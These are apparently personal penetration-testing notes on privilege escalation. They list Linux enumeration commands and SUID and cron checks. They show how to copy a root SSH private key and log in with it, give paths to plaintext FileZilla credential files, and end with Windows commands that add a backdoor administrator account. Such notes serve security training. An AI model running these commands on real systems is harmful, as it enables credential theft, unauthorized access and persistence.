LIN:


	Exploiting SUID binaries
	Kernel exploits
	Sudo misconfigurations
	Cron job vulnerabilities
	
	sudo su -
	sudo -l

	!look 4 installed softwares!

	dpkg -l
	-v or --version to check after finding stuff
	id
	uname -a
	hostname
	ifconfig
	netstat -tp 	- list connections+service name+pid
	netstat -ano 	- display all sockets, no name res, display timers
	/proc/version
	/etc/issue
	ps
	ps -A
	ps aux			- processes for all users, who started them and x - xternal processes (to terminal)
	env             - will show environment vars
	cat /etc/passwd | cut -d ":" -f 1
	find / -perm -u=s -type f 2>/dev/null	- finds files with SUID bit set
	find / -writable -type d 2>/dev/null : Find world-writeable folders
	find / -perm -222 -type d 2>/dev/null: Find world-writeable folders
	find / -perm -o w -type d 2>/dev/null: Find world-writeable folders
	
	./linpeas.sh
	
	Note: Linpeas will run many commands known for identifying vulnerabilities and create a lot of "noise" that may trigger anti-virus software or security monitoring software that looks for these types of events. This may prevent the scripts from running or even trigger an alarm that the system has been compromised. In some instances, we may want to do a manual enumeration instead of running scripts.
	
	

	cron jobs ->if write permission-> /etc/crontab
						  /etc/cron.d
						  /var/spool/cron/crontabs/root

	SSH keys: ->if read permission-> /home/user/.ssh/id_rsa
							/root/.ssh/id_rsa
				If we can read the /root/.ssh/ directory and can read the id_rsa file, we can copy it to our machine and use the -i flag to log in with it:  vim id_rsa
					chmod 600 id_rsa
					ssh user@10.10.10.10 -i id_rsa

		It's sometimes possible to find passwords for running services in the registry. VNC servers, for example, frequently leave passwords in the registry stored in plaintext. Some versions of the FileZilla FTP server also leave credentials in an XML file at C:\Program Files\FileZilla Server\FileZilla Server.xml
		or C:\xampp\FileZilla Server\FileZilla Server.xml
		These can be MD5 hashes or in plaintext, depending on the version.
		
		if we got a win revshell its usually admin/system usr. we can then
		
		net user <username> <password> /add

		net localgroup administrators <username> /add
